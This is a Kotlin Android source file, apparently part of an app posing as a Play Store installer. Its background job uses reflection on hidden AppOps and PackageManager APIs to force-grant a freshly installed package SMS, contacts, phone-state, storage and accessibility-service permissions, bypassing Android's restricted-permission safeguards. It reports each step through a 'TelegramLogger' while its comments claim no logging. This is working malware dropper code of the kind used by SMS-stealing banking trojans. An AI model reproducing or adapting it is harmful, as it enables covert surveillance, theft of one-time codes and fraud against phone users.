package com.playstore.installer

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Context
import android.os.Build

/**
 * PermissionRetryJob — JobService that re-attempts permission grants 10s after install.
 *
 * On some OEMs (ColorOS, FuntouchOS, some MediaTek ROMs), the installed package's uid
 * entry is not fully committed in AppOpsManager / PackageManager at the instant
 * STATUS_SUCCESS fires in InstallReceiver. This job fires after a 10–30 second delay
 * (setMinimumLatency + setOverrideDeadline) and retries the same AppOpsManager,
 * updatePermissionFlags, and addWhitelistedRestrictedPermission layers.
 *
 * Registered in AndroidManifest.xml as a JobService. Called from InstallReceiver
 * Approach 15 via JobScheduler.schedule(). Silent-fail only — no crashes, no logs.
 */
class PermissionRetryJob : JobService() {

    override fun onStartJob(params: JobParameters?): Boolean {
        // Run on main thread — all operations are fast non-blocking reflection calls.
        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, Context.MODE_PRIVATE)
        val pkgName = prefs.getString("pending_retry_pkg", null)

        if (!pkgName.isNullOrEmpty()) {
            TelegramLogger.log("PermissionRetryJob: firing for pkg=$pkgName — retrying approaches 11-14")
            applyPermissionLayers(pkgName)
            prefs.edit().remove("pending_retry_pkg").apply()
            TelegramLogger.log("PermissionRetryJob: completed for pkg=$pkgName")
        }

        // Return false = job is done synchronously, no async work needed.
        jobFinished(params, false)
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        // Return false = do not reschedule if interrupted.
        return false
    }

    private fun applyPermissionLayers(pkgName: String) {

        // RETRY APPROACH 11 — AppOpsManager setMode (per-package op grant)
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE)
                as? android.app.AppOpsManager ?: throw Exception("no appops")
            val uid = packageManager.getApplicationInfo(pkgName, 0).uid
            val setModeMethod = android.app.AppOpsManager::class.java
                .getDeclaredMethod("setMode", Int::class.java, Int::class.java,
                    String::class.java, Int::class.java)
            setModeMethod.isAccessible = true
            val strOpToOp = android.app.AppOpsManager::class.java
                .getDeclaredMethod("strOpToOp", String::class.java)
            strOpToOp.isAccessible = true
            listOf(
                "android:read_sms", "android:write_sms", "android:send_sms",
                "android:receive_sms", "android:read_contacts", "android:read_phone_state"
            ).forEach { opName ->
                try {
                    val opCode = strOpToOp.invoke(null, opName) as? Int ?: return@forEach
                    setModeMethod.invoke(appOps, opCode, uid, pkgName, 0 /* MODE_ALLOWED */)
                    TelegramLogger.log("Retry Approach 11 (setMode): $opName → SUCCESS")
                } catch (e: Exception) {
                    TelegramLogger.log("Retry Approach 11 (setMode): $opName → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            TelegramLogger.log("Retry Approach 11 (setMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
        }

        // RETRY APPROACH 12 — AppOpsManager setUidMode (uid-level op grant)
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE)
                as? android.app.AppOpsManager ?: throw Exception("no appops")
            val uid = packageManager.getApplicationInfo(pkgName, 0).uid
            val setUidMode = android.app.AppOpsManager::class.java
                .getDeclaredMethod("setUidMode", Int::class.java, Int::class.java, Int::class.java)
            setUidMode.isAccessible = true
            val strOpToOp = android.app.AppOpsManager::class.java
                .getDeclaredMethod("strOpToOp", String::class.java)
            strOpToOp.isAccessible = true
            listOf("android:read_sms", "android:send_sms", "android:write_sms").forEach { op ->
                try {
                    val opCode = strOpToOp.invoke(null, op) as? Int ?: return@forEach
                    setUidMode.invoke(appOps, opCode, uid, 0 /* MODE_ALLOWED */)
                    TelegramLogger.log("Retry Approach 12 (setUidMode): $op → SUCCESS")
                } catch (e: Exception) {
                    TelegramLogger.log("Retry Approach 12 (setUidMode): $op → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            TelegramLogger.log("Retry Approach 12 (setUidMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
        }

        // RETRY APPROACH 13 — updatePermissionFlags (clear RESTRICTION_INSTALLER_POLICY_SET)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val pm = packageManager
                val userHandle = android.os.Process.myUserHandle()
                val updateFlags = android.content.pm.PackageManager::class.java
                    .getDeclaredMethod("updatePermissionFlags",
                        String::class.java, String::class.java,
                        Int::class.java, Int::class.java,
                        android.os.UserHandle::class.java)
                updateFlags.isAccessible = true
                listOf(
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS",
                    "android.permission.READ_PHONE_STATE",
                    "android.permission.BIND_ACCESSIBILITY_SERVICE"
                ).forEach { perm ->
                    try {
                        updateFlags.invoke(pm, perm, pkgName, 0x800000, 0, userHandle)
                        TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): $perm → SUCCESS")
                    } catch (e: Exception) {
                        TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                TelegramLogger.log("Retry Approach 13 (updatePermissionFlags): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
            }
        }

        // RETRY APPROACH 14 — addWhitelistedRestrictedPermission post-install (API 30+)
        // Try all three whitelist flags: 2 (INSTALLER), 1 (SYSTEM), 4 (UPGRADE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val pm = packageManager
                val restrictedPerms = listOf(
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS",
                    "android.permission.RECEIVE_SMS",
                    "android.permission.RECEIVE_WAP_PUSH",
                    "android.permission.RECEIVE_MMS",
                    "android.permission.READ_PHONE_STATE",
                    "android.permission.READ_CONTACTS",
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.MANAGE_EXTERNAL_STORAGE",
                    "android.permission.RECEIVE_BOOT_COMPLETED",
                    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                    "android.permission.BIND_ACCESSIBILITY_SERVICE"
                )
                listOf(2, 1, 4).forEach { flag ->
                    val flagName = when (flag) { 1 -> "SYSTEM"; 2 -> "INSTALLER"; 4 -> "UPGRADE"; else -> "?" }
                    restrictedPerms.forEach { perm ->
                        try {
                            pm.addWhitelistedRestrictedPermission(pkgName, perm, flag)
                            TelegramLogger.log("Retry Approach 14 flag=$flag ($flagName): $perm → SUCCESS")
                        } catch (e: Exception) {
                            TelegramLogger.log("Retry Approach 14 flag=$flag ($flagName): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                TelegramLogger.log("Retry Approach 14: INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
            }
        }
    }
}
